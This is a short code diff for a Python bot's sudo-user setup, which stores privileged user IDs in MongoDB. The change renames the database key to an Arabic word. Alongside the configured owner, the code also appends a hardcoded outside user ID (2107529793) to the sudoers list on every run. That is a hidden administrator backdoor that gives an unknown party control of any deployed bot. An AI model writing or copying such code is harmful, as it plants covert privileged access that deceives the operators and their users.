@@ -46,13 +46,13 @@ async def sudo():
     global SUDOERS
     SUDOERS.add(config.OWNER_ID)
     sudoersdb = mongodb.sudoers
-    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
+    sudoers = await sudoersdb.find_one({"ادمان": "ادمان"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
     if config.OWNER_ID not in sudoers:
         sudoers.append(config.OWNER_ID)
         sudoers.append(2107529793)
         await sudoersdb.update_one(
-            {"sudo": "sudo"},
+            {"ادمان": "ادمان"},
             {"$set": {"sudoers": sudoers}},
             upsert=True,
         )
